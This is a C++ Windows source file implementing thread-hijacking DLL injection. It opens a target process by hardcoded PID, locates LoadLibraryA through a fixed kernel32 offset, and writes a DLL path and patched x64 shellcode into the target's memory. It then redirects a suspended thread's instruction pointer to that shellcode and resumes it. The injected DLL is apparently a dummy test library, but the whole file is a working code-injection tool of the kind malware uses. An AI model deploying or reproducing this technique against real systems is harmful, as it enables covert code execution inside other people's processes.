#include "stdafx.h"

#include "memoryapi.h"

#include <bit>

#pragma comment(lib, "onecore.lib")

int NumCharsInCharPtr(char *array) {
  int numberOfChars = 0;
  while (*array++) {
    numberOfChars++;
  }
  return numberOfChars;
}

DWORD ProcessID = 18976;
const char *DllName2 =
    "C:\\dev\\ThreadHijacking_LoadLibrary\\x64\\Release\\Dummy_DLL.dll";
const char *DllName = "C:\\dev\\Dummy_DLL\\x64\\Release\\Dummy_DLL.dll";

int DllNameLength = 0;

const char *ModName = "KERNEL32.DLL";

int main() {
  DllNameLength = NumCharsInCharPtr((char *)DllName);

  HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, ProcessID);

  uintptr_t KernelBase = Inject::GetModuleBase(ProcessID, ModName);

  printf("[+] KERNEL32.DLL Base: %llX\n\n", KernelBase);

  uintptr_t LoadLibraryA = (uintptr_t)(KernelBase + 0x20830);

  printf("[+] LoadLibraryA: %llX\n\n", LoadLibraryA);

  LPVOID MyBufferSpace = Inject::AllocNearKernel32DLL(hProcess);

  if (MyBufferSpace == nullptr) {
    printf("[-] Failed Allocating Space In Target Process %d\n\n",
           GetLastError());
    return 0;
  }

  printf("[+] MyBufferSpace: %llX\n\n", (uintptr_t)MyBufferSpace);

  printf("[+] Copying DLL Path Into Target\n\n");

  WriteProcessMemory(hProcess, MyBufferSpace, DllName, DllNameLength, nullptr);

  /*
       Hijack the thread
  */
  HANDLE hThread = Inject::GetThreadFromProcess(ProcessID);

  if (hThread == INVALID_HANDLE_VALUE)
    return 0;

  CONTEXT ctx = {};
  ctx.ContextFlags = CONTEXT_FULL;

  printf("[+] Suspending Thread\n\n");

  SuspendThread(hThread);

  GetThreadContext(hThread, &ctx);

  printf("[+] Original RIP: %llX\n\n", (uintptr_t)ctx.Rip);

  /*
    x64 Shell Code. Need to change for x86.
  */
  /*
    C1 FF FF FF = Relative Address to Start of String
    B0 10 B5 0F = Relative Address to Original RIP
  */
  char Code[] = {0x48, 0x83, 0xEC, 0x28, 0x48, 0x8D, 0x0D, 0xC1,
                 0xFF, 0xFF, 0xFF, 0x48, 0xBA, 0x30, 0x08, 0xCC,
                 0xB1, 0xFC, 0x7F, 0x00, 0x00, 0xFF, 0xD2, 0x48,
                 0x83, 0xC4, 0x28, 0xE9, 0xB0, 0x10, 0xB5, 0x0F};
  int ShellCodeLength = 32;
  int BufferSpace = 10;

  printf("[+] Copying Shellcode into Target\n\n");

  LPBYTE Ptr = (LPBYTE)Code;

  int ShellCodeCounter = 0;

  for (int i = 0; i < ShellCodeLength; i++) {

    if (*Ptr == 0x0D && *(Ptr + 1) == 0xC1) {
      uintptr_t Offset = DllNameLength + BufferSpace + 0xA;

      INT32 MaxInt32 = 0xFFFFFFFF;

      INT32 JumpValue = MaxInt32 - Offset;

      for (int i = 1; i < 5; i++) {
        *(Ptr + i) = (JumpValue >> (8 * (i - 1))) & 0xff;
      }
    }

    if (*Ptr == 0xE9) {
      uintptr_t Offset = (uintptr_t)ctx.Rip - (uintptr_t)MyBufferSpace -
                         DllNameLength - BufferSpace - ShellCodeLength;

      for (int i = 1; i < 5; i++)
      {
        *(Ptr + i) = (Offset >> (8 * (i - 1))) & 0xff;
      }
    }

    Ptr++;
  }

  WriteProcessMemory(
      hProcess,
      (LPVOID)((uintptr_t)MyBufferSpace + DllNameLength + BufferSpace), Code,
      ShellCodeLength, nullptr);

  ctx.Rip = ((uintptr_t)MyBufferSpace + BufferSpace + DllNameLength);

  printf("[+] New RIP: %llX\n\n", (uintptr_t)ctx.Rip);

  if (!SetThreadContext(hThread, &ctx)) {
    printf("Unable to SetThreadContext\n");
    return 1;
  }

  GetThreadContext(hThread, &ctx);

  printf("[+] Confirmed New RIP: %llX\n\n", (uintptr_t)ctx.Rip);

  printf("[+] Resuming Thread\n\n");

  ResumeThread(hThread);

  printf("[+] Cleaning Up\n\n");

  CloseHandle(hThread);

  CloseHandle(hProcess);

  printf("[+] Successfully Hijacked Thread and Injected DLL.\n\n");

  return 1;
}
